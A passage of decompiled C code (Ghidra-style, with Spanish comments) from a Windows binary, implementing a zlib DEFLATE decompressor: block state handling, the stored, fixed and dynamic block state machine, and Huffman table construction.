  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return;
}



/* Reinicia el estado de un bloque y notifica al consumidor de salida. */
void __cdecl FUN_004042c0(int *param_1,int param_2,int *param_3)

{
  int iVar1;
  
  if (param_3 != (int *)0x0) {
    *param_3 = param_1[0xf];
  }
  if ((*param_1 == 4) || (*param_1 == 5)) {
    (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[3]);
  }
  if (*param_1 == 6) {
    FUN_004042af(param_1[1],param_2);
  }
  *param_1 = 0;
  param_1[0xd] = param_1[10];
  param_1[0xc] = param_1[10];
  param_1[7] = 0;
  param_1[8] = 0;
  if ((code *)param_1[0xe] != (code *)0x0) {
    iVar1 = (*(code *)param_1[0xe])(0,0,0);
    param_1[0xf] = iVar1;
    *(int *)(param_2 + 0x30) = iVar1;
  }
  return;
}



/* Crea las estructuras auxiliares y el anillo de salida del descompresor. */
int * __cdecl FUN_0040432b(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x40);
  if (piVar1 != (int *)0x0) {
    iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),8,0x5a0);
    piVar1[9] = iVar2;
    if (iVar2 == 0) {
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1);
    }
    else {
      iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,param_3);
      piVar1[10] = iVar2;
      if (iVar2 != 0) {
        *piVar1 = 0;
        piVar1[0xb] = iVar2 + param_3;
        piVar1[0xe] = param_2;
        FUN_004042c0(piVar1,param_1,(int *)0x0);
        return piVar1;
      }
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1[9]);
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1);
    }
  }
  return (int *)0x0;
}



/* Maquina de estados principal para cabeceras y bloques DEFLATE. */
void __cdecl FUN_004043b6(uint *param_1,int *param_2,uint param_3)

{
  uint *puVar1;
  byte bVar2;
  void *pvVar3;
  void *pvVar4;
  uint *puVar5;
  int *piVar6;
  int iVar7;
  undefined4 uVar8;
  uint uVar9;
  byte *_Src;
  int local_30;
  int local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  void *local_c;
  uint local_8;
  
  piVar6 = param_2;
  puVar5 = param_1;
  local_c = (void *)param_1[0xd];
  local_8 = param_2[1];
  _Src = (byte *)*param_2;
  param_2 = (int *)param_1[7];
  if (local_c < (void *)param_1[0xc]) {
    local_14 = (int)param_1[0xc] + (-1 - (int)local_c);
  }
  else {
    local_14 = param_1[0xb] - (int)local_c;
  }
  uVar9 = *param_1;
  param_1 = (uint *)param_1[8];
  while (uVar9 < 10) {
    switch((&switchD_00404408::switchdataD_00404bbd)[uVar9]) {
    case (undefined *)0x40440f:
      for (; param_2 < (int *)0x3; param_2 = param_2 + 2) {
        if (local_8 == 0) goto LAB_00404a58;
        param_3 = 0;
        local_8 = local_8 - 1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
      }
      uVar9 = ((uint)param_1 & 7) >> 1;
      puVar5[6] = (uint)param_1 & 1;
      if (uVar9 == 0) {
        *puVar5 = 1;
        uVar9 = (int)param_2 - 3U & 7;
        param_1 = (uint *)(((uint)param_1 >> 3) >> (sbyte)uVar9);
        param_2 = (int *)(((int)param_2 - 3U) - uVar9);
        break;
      }
      if (uVar9 == 1) {
        FUN_00405122(&local_28,&local_24,&local_20,&local_1c);
        uVar9 = FUN_00403cc8((char)local_28,(char)local_24,local_20,local_1c,(int)piVar6);
        puVar5[1] = uVar9;
        if (uVar9 == 0) goto LAB_00404b1c;
        param_1 = (uint *)((uint)param_1 >> 3);
        param_2 = (int *)((int)param_2 + -3);
        *puVar5 = 6;
        break;
      }
      if (uVar9 == 2) {
        param_1 = (uint *)((uint)param_1 >> 3);
        uVar9 = 3;
        param_2 = (int *)((int)param_2 + -3);
        goto LAB_00404469;
      }
      if (uVar9 != 3) break;
      *puVar5 = 9;
      piVar6[6] = (int)s_invalid_block_type_0040f6ac;
      puVar5[8] = (uint)param_1 >> 3;
      param_2 = (int *)((int)param_2 - 3);
      goto LAB_00404a28;
    case (undefined *)0x4044dc:
      for (; param_2 < (int *)0x20; param_2 = param_2 + 2) {
        if (local_8 == 0) goto LAB_00404a58;
        param_3 = 0;
        local_8 = local_8 - 1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
      }
      if (~(uint)param_1 >> 0x10 != ((uint)param_1 & 0xffff)) {
        *puVar5 = 9;
        piVar6[6] = (int)s_invalid_stored_block_lengths_0040f68c;
        goto switchD_00404408_caseD_404a1f;
      }
      puVar5[1] = (uint)param_1 & 0xffff;
      param_2 = (int *)0x0;
      param_1 = (uint *)0x0;
      if (puVar5[1] == 0) goto LAB_0040461c;
      uVar9 = 2;
LAB_00404469:
      *puVar5 = uVar9;
      break;
    case (undefined *)0x40453a:
      if (local_8 == 0) {
LAB_00404a58:
        puVar5[8] = (uint)param_1;
        puVar5[7] = (uint)param_2;
        piVar6[1] = 0;
LAB_00404a68:
        iVar7 = *piVar6;
        *piVar6 = (int)_Src;
        piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
        puVar5[0xd] = (uint)local_c;
        goto LAB_004049e5;
      }
      if (local_14 == 0) {
        local_14 = 0;
        if (local_c == (void *)puVar5[0xb]) {
          pvVar3 = (void *)puVar5[0xc];
          pvVar4 = (void *)puVar5[10];
          if (pvVar4 != pvVar3) {
            if (pvVar4 < pvVar3) {
              local_14 = (int)pvVar3 + (-1 - (int)pvVar4);
            }
            else {
              local_14 = (int)puVar5[0xb] - (int)pvVar4;
            }
            local_c = pvVar4;
            if (local_14 != 0) goto LAB_004045d7;
          }
        }
        puVar5[0xd] = (uint)local_c;
        param_3 = FUN_00403bd6((int)puVar5,piVar6,param_3);
        pvVar3 = (void *)puVar5[0xc];
        local_c = (void *)puVar5[0xd];
        if (local_c < pvVar3) {
          local_14 = (int)pvVar3 + (-1 - (int)local_c);
        }
        else {
          local_14 = puVar5[0xb] - (int)local_c;
        }
        if (local_c == (void *)puVar5[0xb]) {
          pvVar4 = (void *)puVar5[10];
          if (pvVar4 != pvVar3) {
            local_c = pvVar4;
            if (pvVar4 < pvVar3) {
              local_14 = (int)pvVar3 + (-1 - (int)pvVar4);
            }
            else {
              local_14 = (int)puVar5[0xb] - (int)pvVar4;
            }
          }
        }
        if (local_14 == 0) {
          puVar5[8] = (uint)param_1;
          puVar5[7] = (uint)param_2;
          piVar6[1] = local_8;
          goto LAB_00404a68;
        }
      }
LAB_004045d7:
      local_10 = puVar5[1];
      param_3 = 0;
      if (local_8 < local_10) {
        local_10 = local_8;
      }
      if (local_14 < local_10) {
        local_10 = local_14;
      }
      memcpy(local_c,_Src,local_10);
      local_8 = local_8 - local_10;
      local_c = (void *)((int)local_c + local_10);
      local_14 = local_14 - local_10;
      _Src = _Src + local_10;
      puVar1 = puVar5 + 1;
      *puVar1 = *puVar1 - local_10;
      if (*puVar1 == 0) {
LAB_0040461c:
        uVar9 = -(uint)(puVar5[6] != 0) & 7;
        goto LAB_00404469;
      }
      break;
    case (undefined *)0x40462b:
      for (; param_2 < (int *)0xe; param_2 = param_2 + 2) {
        if (local_8 == 0) goto LAB_00404a58;
        param_3 = 0;
        local_8 = local_8 - 1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
      }
      puVar5[1] = (uint)param_1 & 0x3fff;
      if ((0x1d < ((uint)param_1 & 0x1f)) || (0x3a0 < ((uint)param_1 & 0x3e0))) {
        *puVar5 = 9;
        piVar6[6] = (int)s_too_many_length_or_distance_symb_0040f668;
        goto switchD_00404408_caseD_404a1f;
      }
      uVar9 = (*(code *)piVar6[8])
                        (piVar6[10],
                         (((uint)param_1 & 0x3fff) >> 5 & 0x1f) + 0x102 + ((uint)param_1 & 0x1f),4);
      puVar5[3] = uVar9;
      if (uVar9 != 0) {
        param_1 = (uint *)((uint)param_1 >> 0xe);
        param_2 = (int *)((int)param_2 + -0xe);
        puVar5[2] = 0;
        *puVar5 = 4;
        goto switchD_00404408_caseD_4046b8;
      }
LAB_00404b1c:
      param_3 = 0xfffffffc;
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      piVar6[1] = local_8;
      iVar7 = *piVar6;
      *piVar6 = (int)_Src;
      piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
      puVar5[0xd] = (uint)local_c;
      goto LAB_004049e5;
    case (undefined *)0x4046b8:
switchD_00404408_caseD_4046b8:
      if (puVar5[2] < (puVar5[1] >> 10) + 4) {
        do {
          for (; param_2 < (int *)0x3; param_2 = param_2 + 2) {
            if (local_8 == 0) goto LAB_00404a58;
            param_3 = 0;
            local_8 = local_8 - 1;
            param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
            _Src = _Src + 1;
          }
          uVar9 = (uint)param_1 & 7;
          param_2 = (int *)((int)param_2 + -3);
          param_1 = (uint *)((uint)param_1 >> 3);
          *(uint *)(puVar5[3] + *(int *)(&DAT_0040cdf0 + puVar5[2] * 4) * 4) = uVar9;
          puVar5[2] = puVar5[2] + 1;
        } while (puVar5[2] < (puVar5[1] >> 10) + 4);
      }
      while (puVar5[2] < 0x13) {
        *(undefined4 *)(puVar5[3] + *(int *)(&DAT_0040cdf0 + puVar5[2] * 4) * 4) = 0;
        puVar5[2] = puVar5[2] + 1;
      }
      puVar5[4] = 7;
      local_10 = FUN_00404fa0((int *)puVar5[3],puVar5 + 4,(int *)(puVar5 + 5),puVar5[9],(int)piVar6)
      ;
      if (local_10 == 0) {
        puVar5[2] = 0;
        *puVar5 = 5;
        goto switchD_00404408_caseD_40476e;
      }
      goto LAB_00404ae0;
    case (undefined *)0x40476e:
switchD_00404408_caseD_40476e:
      while (puVar5[2] < (puVar5[1] >> 5 & 0x1f) + 0x102 + (puVar5[1] & 0x1f)) {
        for (; param_2 < (int *)puVar5[4]; param_2 = param_2 + 2) {
          if (local_8 == 0) goto LAB_00404a58;
          param_3 = 0;
          local_8 = local_8 - 1;
          param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
          _Src = _Src + 1;
        }
        local_18 = *(uint *)(puVar5[5] + 4 +
                            (*(uint *)(&DAT_0040bca8 + (int)puVar5[4] * 4) & (uint)param_1) * 8);
        bVar2 = *(byte *)(puVar5[5] +
                          (*(uint *)(&DAT_0040bca8 + (int)puVar5[4] * 4) & (uint)param_1) * 8 + 1);
        local_10 = (uint)bVar2;
        if (local_18 < 0x10) {
          param_1 = (uint *)((uint)param_1 >> (bVar2 & 0x1f));
          param_2 = (int *)((int)param_2 - local_10);
          *(uint *)(puVar5[3] + puVar5[2] * 4) = local_18;
          puVar5[2] = puVar5[2] + 1;
        }
        else {
          if (local_18 == 0x12) {
            iVar7 = 7;
          }
          else {
            iVar7 = local_18 - 0xe;
          }
          local_14 = ((local_18 != 0x12) - 1 & 8) + 3;
          for (; param_2 < (int *)(iVar7 + local_10); param_2 = param_2 + 2) {
            if (local_8 == 0) goto LAB_00404a58;
            param_3 = 0;
            local_8 = local_8 - 1;
            param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
            _Src = _Src + 1;
          }
          uVar9 = (uint)param_1 >> (bVar2 & 0x1f);
          local_14 = local_14 + (*(uint *)(&DAT_0040bca8 + iVar7 * 4) & uVar9);
          param_1 = (uint *)(uVar9 >> ((byte)iVar7 & 0x1f));
          uVar9 = puVar5[2];
          param_2 = (int *)((int)param_2 - (iVar7 + local_10));
          if ((puVar5[1] >> 5 & 0x1f) + 0x102 + (puVar5[1] & 0x1f) < local_14 + uVar9) {
LAB_00404a94:
            (*(code *)piVar6[9])(piVar6[10],puVar5[3]);
            *puVar5 = 9;
            piVar6[6] = (int)s_invalid_bit_length_repeat_0040f64c;
            puVar5[8] = (uint)param_1;
            puVar5[7] = (uint)param_2;
            piVar6[1] = local_8;
            iVar7 = *piVar6;
            *piVar6 = (int)_Src;
            piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
            puVar5[0xd] = (uint)local_c;
            FUN_00403bd6((int)puVar5,piVar6,-3);
            return;
          }
          if (local_18 == 0x10) {
            if (uVar9 == 0) goto LAB_00404a94;
            uVar8 = *(undefined4 *)((puVar5[3] - 4) + uVar9 * 4);
          }
          else {
            uVar8 = 0;
          }
          do {
            *(undefined4 *)(puVar5[3] + uVar9 * 4) = uVar8;
            uVar9 = uVar9 + 1;
            local_14 = local_14 - 1;
          } while (local_14 != 0);
          puVar5[2] = uVar9;
          local_14 = 0;
        }
      }
      puVar5[5] = 0;
      local_18 = 9;
      local_14 = 6;
      local_10 = FUN_0040501f((puVar5[1] & 0x1f) + 0x101,(puVar5[1] >> 5 & 0x1f) + 1,
                              (int *)puVar5[3],&local_18,&local_14,&local_30,&local_2c,puVar5[9],
                              (int)piVar6);
      if (local_10 == 0) {
        uVar9 = FUN_00403cc8((char)local_18,(char)local_14,local_30,local_2c,(int)piVar6);
        if (uVar9 == 0) goto LAB_00404b1c;
        puVar5[1] = uVar9;
        (*(code *)piVar6[9])(piVar6[10],puVar5[3]);
        *puVar5 = 6;
        goto switchD_00404408_caseD_404935;
      }
LAB_00404ae0:
      if (local_10 == 0xfffffffd) {
        (*(code *)piVar6[9])(piVar6[10],puVar5[3]);
        *puVar5 = 9;
      }
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      piVar6[1] = local_8;
      iVar7 = *piVar6;
      *piVar6 = (int)_Src;
      piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
      puVar5[0xd] = (uint)local_c;
      param_3 = local_10;
      goto LAB_004049e5;
    case (undefined *)0x404935:
switchD_00404408_caseD_404935:
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      piVar6[1] = local_8;
      iVar7 = *piVar6;
      *piVar6 = (int)_Src;
      piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
      puVar5[0xd] = (uint)local_c;
      param_3 = FUN_00403cfc((uint)puVar5,piVar6,param_3);
      if (param_3 != 1) goto LAB_004049e5;
      param_3 = 0;
      FUN_004042af(puVar5[1],(int)piVar6);
      local_8 = piVar6[1];
      _Src = (byte *)*piVar6;
      param_1 = (uint *)puVar5[8];
      param_2 = (int *)puVar5[7];
      local_c = (void *)puVar5[0xd];
      if (local_c < (void *)puVar5[0xc]) {
        local_14 = (int)puVar5[0xc] + (-1 - (int)local_c);
      }
      else {
        local_14 = puVar5[0xb] - (int)local_c;
      }
      if (puVar5[6] != 0) {
        *puVar5 = 7;
        goto switchD_00404408_caseD_404b4a;
      }
      *puVar5 = 0;
      break;
    case (undefined *)0x404a1f:
switchD_00404408_caseD_404a1f:
      puVar5[8] = (uint)param_1;
LAB_00404a28:
      puVar5[7] = (uint)param_2;
      piVar6[1] = local_8;
      iVar7 = *piVar6;
      *piVar6 = (int)_Src;
      param_3 = 0xfffffffd;
      piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
      puVar5[0xd] = (uint)local_c;
      goto LAB_004049e5;
    case (undefined *)0x404b4a:
switchD_00404408_caseD_404b4a:
      puVar5[0xd] = (uint)local_c;
      param_3 = FUN_00403bd6((int)puVar5,piVar6,param_3);
      local_c = (void *)puVar5[0xd];
      if ((void *)puVar5[0xc] == local_c) {
        *puVar5 = 8;
        goto switchD_00404408_caseD_404b95;
      }
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      piVar6[1] = local_8;
      iVar7 = *piVar6;
      *piVar6 = (int)_Src;
      piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
      puVar5[0xd] = (uint)local_c;
      goto LAB_004049e5;
    case (undefined *)0x404b95:
switchD_00404408_caseD_404b95:
      param_3 = 1;
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      piVar6[1] = local_8;
      iVar7 = *piVar6;
      *piVar6 = (int)_Src;
      piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
      puVar5[0xd] = (uint)local_c;
      goto LAB_004049e5;
    }
    uVar9 = *puVar5;
  }
  param_3 = 0xfffffffe;
  puVar5[8] = (uint)param_1;
  puVar5[7] = (uint)param_2;
  piVar6[1] = local_8;
  iVar7 = *piVar6;
  *piVar6 = (int)_Src;
  piVar6[2] = (int)(_Src + (piVar6[2] - iVar7));
  puVar5[0xd] = (uint)local_c;
LAB_004049e5:
  FUN_00403bd6((int)puVar5,piVar6,param_3);
  return;
}



/* Libera el estado de un bloque y sus dos buffers de trabajo. */
undefined4 __cdecl FUN_00404be5(int *param_1,int param_2)

{
  FUN_004042c0(param_1,param_2,(int *)0x0);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[10]);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[9]);
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return 0;
}



/* Construye una tabla de Huffman a partir de longitudes de codigo. */
undefined4 __cdecl
FUN_00404c19(int *param_1,uint param_2,uint param_3,int param_4,int param_5,int *param_6,
            uint *param_7,int param_8,uint *param_9,uint *param_10)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint *puVar6;
  uint *puVar7;
  int iVar8;
  int *piVar9;
  undefined4 *puVar10;
  byte bVar11;
  int iVar12;
  uint uVar13;
  uint *puVar14;
  uint uVar15;
  int local_f4 [15];
  uint local_b8 [16];
  uint local_78 [19];
  undefined4 local_2c;
  uint local_28;
  uint *local_24;
  int local_20;
  uint *local_1c;
  uint local_18;
  uint *local_14;
  uint local_10;
  int local_c;
  uint *local_8;
  
  puVar6 = param_7;
  local_78[0] = 0;
  local_78[1] = 0;
  local_78[2] = 0;
  local_78[3] = 0;
  local_78[4] = 0;
  local_78[5] = 0;
  local_78[6] = 0;
  local_78[7] = 0;
  local_78[8] = 0;
  local_78[9] = 0;
  local_78[10] = 0;
  local_78[0xb] = 0;
  local_78[0xc] = 0;
  local_78[0xd] = 0;
  local_78[0xe] = 0;
  local_78[0xf] = 0;
  piVar9 = param_1;
  uVar13 = param_2;
  do {
    iVar12 = *piVar9;
    piVar9 = piVar9 + 1;
    local_78[iVar12] = local_78[iVar12] + 1;
    uVar13 = uVar13 - 1;
  } while (uVar13 != 0);
  if (local_78[0] == param_2) {
    *param_6 = 0;
    *param_7 = 0;
  }
  else {
    puVar7 = (uint *)0x1;
    puVar14 = local_78;
    param_7 = (uint *)*param_7;
    do {
      puVar14 = puVar14 + 1;
      if (*puVar14 != 0) break;
      puVar7 = (uint *)((int)puVar7 + 1);
    } while (puVar7 < (uint *)0x10);
    local_8 = puVar7;
    if (param_7 < puVar7) {
      param_7 = puVar7;
    }
    puVar14 = local_78 + 0xf;
    puVar2 = (uint *)0xf;
    do {
      if (*puVar14 != 0) break;
      puVar2 = (uint *)((int)puVar2 - 1);
      puVar14 = puVar14 + -1;
    } while (puVar2 != (uint *)0x0);
    local_1c = puVar2;
    if (puVar2 < param_7) {
      param_7 = puVar2;
    }
    iVar12 = 1 << ((byte)puVar7 & 0x1f);
    *puVar6 = (uint)param_7;
    if (puVar7 < puVar2) {
      puVar6 = local_78 + (int)puVar7;
      do {
        uVar13 = *puVar6;
        if ((int)(iVar12 - uVar13) < 0) {
          return 0xfffffffd;
        }
        puVar7 = (uint *)((int)puVar7 + 1);
        puVar6 = puVar6 + 1;
        iVar12 = (iVar12 - uVar13) * 2;
      } while (puVar7 < puVar2);
    }
    local_78[0x11] = iVar12 - local_78[(int)puVar2];
    if ((int)local_78[0x11] < 0) {
      return 0xfffffffd;
    }
    local_b8[1] = 0;
    local_78[(int)puVar2] = local_78[(int)puVar2] + local_78[0x11];
    iVar8 = 0;
    iVar12 = (int)puVar2 - 1;
    if (iVar12 != 0) {
      iVar4 = 0;
      do {
        iVar8 = iVar8 + *(int *)((int)local_78 + iVar4 + 4);
        iVar12 = iVar12 + -1;
        *(int *)((int)local_b8 + iVar4 + 8) = iVar8;
        iVar4 = iVar4 + 4;
      } while (iVar12 != 0);
    }
    uVar13 = 0;
    do {
      iVar12 = *param_1;
      param_1 = param_1 + 1;
      if (iVar12 != 0) {
        uVar15 = local_b8[iVar12];
        param_10[uVar15] = uVar13;
        local_b8[iVar12] = uVar15 + 1;
      }
      uVar13 = uVar13 + 1;
    } while (uVar13 < param_2);
    uVar13 = local_b8[(int)puVar2];
    local_c = -1;
    local_10 = 0;
    local_14 = param_10;
    iVar12 = -(int)param_7;
    local_b8[0] = 0;
    local_f4[0] = 0;
    local_20 = 0;
    param_1 = (int *)0x0;
    if ((int)local_8 <= (int)local_1c) {
      local_78[0x12] = (int)local_8 - 1;
      local_24 = local_78 + (int)local_8;
      uVar15 = local_28;
      do {
        uVar3 = *local_24;
        local_18 = uVar3 - 1;
        uVar1 = local_2c;
        while (uVar3 != 0) {
          local_2c._2_2_ = (undefined2)((uint)uVar1 >> 0x10);
          local_78[0x10] = (int)param_7 + iVar12;
          if ((int)local_78[0x10] < (int)local_8) {
            do {
              local_2c = uVar1;
              iVar8 = local_c;
              local_c = local_c + 1;
              iVar12 = iVar12 + (int)param_7;
              local_78[0x10] = local_78[0x10] + (int)param_7;
              param_1 = (int *)((int)local_1c - iVar12);
              if (param_7 < param_1) {
                param_1 = (int *)param_7;
              }
              piVar9 = (int *)((int)local_8 - iVar12);
              uVar3 = 1 << ((byte)piVar9 & 0x1f);
              if ((local_18 + 1 < uVar3) &&
                 (iVar4 = uVar3 + (-1 - local_18), puVar6 = local_24, piVar9 < param_1)) {
                while (piVar9 = (int *)((int)piVar9 + 1), piVar9 < param_1) {
                  uVar3 = puVar6[1];
                  puVar6 = puVar6 + 1;
                  uVar5 = iVar4 * 2;
                  if (uVar5 < uVar3 || uVar5 - uVar3 == 0) break;
                  iVar4 = uVar5 - uVar3;
                }
              }
              param_1 = (int *)(1 << ((byte)piVar9 & 0x1f));
              uVar3 = *param_9 + (int)param_1;
              if (0x5a0 < uVar3) {
                return 0xfffffffd;
              }
              local_20 = param_8 + *param_9 * 8;
              local_f4[local_c] = local_20;
              uVar5 = local_10;
              iVar4 = local_20;
              *param_9 = uVar3;
              if (local_c == 0) {
                *param_6 = local_20;
              }
              else {
                local_b8[local_c] = local_10;
                local_2c._0_2_ = CONCAT11((char)param_7,(byte)piVar9);
                uVar5 = uVar5 >> ((char)iVar12 - (char)param_7 & 0x1fU);
                iVar8 = local_f4[iVar8];
                uVar15 = (iVar4 - iVar8 >> 3) - uVar5;
                *(undefined4 *)(iVar8 + uVar5 * 8) = local_2c;
                *(uint *)(iVar8 + 4 + uVar5 * 8) = uVar15;
              }
              uVar1 = local_2c;
            } while ((int)local_78[0x10] < (int)local_8);
          }
          uVar3 = local_18;
          bVar11 = (byte)iVar12;
          if (local_14 < param_10 + uVar13) {
            uVar15 = *local_14;
            if (uVar15 < param_3) {
              local_2c._0_1_ = (-(uVar15 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar8 = (uVar15 - param_3) * 4;
              local_2c._0_1_ = *(char *)(iVar8 + param_5) + 'P';
              uVar15 = *(uint *)(iVar8 + param_4);
            }
            local_14 = local_14 + 1;
          }
          else {
            local_2c._0_1_ = -0x40;
          }
          local_2c = CONCAT31(CONCAT21(local_2c._2_2_,(char)local_8 - bVar11),(char)local_2c);
          iVar8 = 1 << ((char)local_8 - bVar11 & 0x1f);
          piVar9 = (int *)(local_10 >> (bVar11 & 0x1f));
          if (piVar9 < param_1) {
            puVar10 = (undefined4 *)(local_20 + (int)piVar9 * 8);
            do {
              piVar9 = (int *)((int)piVar9 + iVar8);
              *puVar10 = local_2c;
              puVar10[1] = uVar15;
              puVar10 = puVar10 + iVar8 * 2;
            } while (piVar9 < param_1);
          }
          uVar5 = 1 << ((byte)local_78[0x12] & 0x1f);
          while ((local_10 & uVar5) != 0) {
            local_10 = local_10 ^ uVar5;
            uVar5 = uVar5 >> 1;
          }
          local_10 = local_10 ^ uVar5;
          for (puVar6 = local_b8 + local_c;
              ((1 << ((byte)iVar12 & 0x1f)) - 1U & local_10) != *puVar6; puVar6 = puVar6 + -1) {
            local_c = local_c + -1;
            iVar12 = iVar12 - (int)param_7;
          }
          local_18 = local_18 - 1;
          uVar1 = local_2c;
        }
        local_8 = (uint *)((int)local_8 + 1);
        local_24 = local_24 + 1;
        local_78[0x12] = local_78[0x12] + 1;
        local_2c = uVar1;
      } while ((int)local_8 <= (int)local_1c);
    }
    if ((local_78[0x11] != 0) && (local_1c != (uint *)0x1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}



/* Construye la tabla Huffman de longitudes dinamicas del encabezado DEFLATE. */
int __cdecl FUN_00404fa0(int *param_1,uint *param_2,int *param_3,int param_4,int param_5)

{
  uint *puVar1;
  int iVar2;
  uint local_8;
  
  local_8 = 0;
  puVar1 = (uint *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    iVar2 = -4;
  }
  else {
    iVar2 = FUN_00404c19(param_1,0x13,0x13,0,0,param_3,param_2,param_4,&local_8,puVar1);
    if (iVar2 == -3) {
      *(char **)(param_5 + 0x18) = s_oversubscribed_dynamic_bit_lengt_0040f6e4;
    }
    else if ((iVar2 == -5) || (*param_2 == 0)) {
      *(char **)(param_5 + 0x18) = s_incomplete_dynamic_bit_lengths_t_0040f6c0;
      iVar2 = -3;
    }
    (**(code **)(param_5 + 0x24))(*(undefined4 *)(param_5 + 0x28),puVar1);
  }
  return iVar2;
}



/* Construye las tablas Huffman de literales y distancias. */
int __cdecl
FUN_0040501f(uint param_1,uint param_2,int *param_3,uint *param_4,uint *param_5,int *param_6,
            int *param_7,int param_8,int param_9)

{
  uint *puVar1;
  int iVar2;
  uint local_8;
  
  local_8 = 0;
  puVar1 = (uint *)(**(code **)(param_9 + 0x20))(*(undefined4 *)(param_9 + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00404c19(param_3,param_1,0x101,0x40ce6c,0x40cee8,param_6,param_4,param_8,&local_8,
                       puVar1);
  if (iVar2 == 0) {
    if (*param_4 == 0) goto LAB_00405104;
    iVar2 = FUN_00404c19(param_3 + param_1,param_2,0,0x40cf64,0x40cfdc,param_7,param_5,param_8,
                         &local_8,puVar1);
    if (iVar2 == 0) {
      if ((*param_5 != 0) || (param_1 < 0x102)) {
        iVar2 = 0;
        goto LAB_00405110;
      }
LAB_004050e8:
      *(char **)(param_9 + 0x18) = s_empty_distance_tree_with_lengths_0040f750;
    }
    else {
      if (iVar2 == -3) {
        *(char **)(param_9 + 0x18) = s_oversubscribed_distance_tree_0040f790;
        goto LAB_00405110;
      }
      if (iVar2 != -5) {
        if (iVar2 == -4) goto LAB_00405110;
        goto LAB_004050e8;
      }
      *(char **)(param_9 + 0x18) = s_incomplete_distance_tree_0040f774;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(param_9 + 0x18) = s_oversubscribed_literal_length_tr_0040f72c;
      goto LAB_00405110;
    }
    if (iVar2 == -4) goto LAB_00405110;
LAB_00405104:
    *(char **)(param_9 + 0x18) = s_incomplete_literal_length_tree_0040f70c;
  }
  iVar2 = -3;
LAB_00405110:
  (**(code **)(param_9 + 0x24))(*(undefined4 *)(param_9 + 0x28),puVar1);
  return iVar2;
}



/* Proporciona las tablas fijas y sus parametros de decodificacion. */
undefined4 __cdecl
FUN_00405122(undefined4 *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4)

{
  *param_1 = 9;
  *param_2 = 5;
  *param_3 = &DAT_0040bcf0;
  *param_4 = &DAT_0040ccf0;
  return 0;
}



/* Decodifica simbolos Huffman y copia coincidencias al anillo de salida. */
undefined4 __cdecl
FUN_0040514d(int param_1,int param_2,int param_3,int param_4,int param_5,int *param_6)

{
  byte bVar1;
  uint uVar2;
  int *piVar3;
  int iVar4;
  byte *pbVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  byte *pbVar12;
  undefined4 uStack_2c;
  byte *local_14;
  byte *local_10;
  byte *local_c;
  uint local_8;
  
  piVar3 = param_6;
  local_10 = *(byte **)(param_5 + 0x34);
  uVar9 = *(uint *)(param_5 + 0x1c);
  local_c = (byte *)*param_6;
  local_8 = param_6[1];
  param_6 = *(int **)(param_5 + 0x20);
  if (local_10 < *(byte **)(param_5 + 0x30)) {
    local_14 = *(byte **)(param_5 + 0x30) + (-1 - (int)local_10);
  }
  else {
    local_14 = (byte *)(*(int *)(param_5 + 0x2c) - (int)local_10);
  }
  uVar8 = *(uint *)(&DAT_0040bca8 + param_1 * 4);
  uVar2 = *(uint *)(&DAT_0040bca8 + param_2 * 4);
  do {
    for (; uVar9 < 0x14; uVar9 = uVar9 + 8) {
      local_8 = local_8 - 1;
      param_6 = (int *)((uint)param_6 | (uint)*local_c << ((byte)uVar9 & 0x1f));
      local_c = local_c + 1;
    }
    pbVar12 = (byte *)(param_3 + (uVar8 & (uint)param_6) * 8);
    bVar1 = *pbVar12;
LAB_004051d5:
    uVar6 = (uint)bVar1;
    if (uVar6 != 0) {
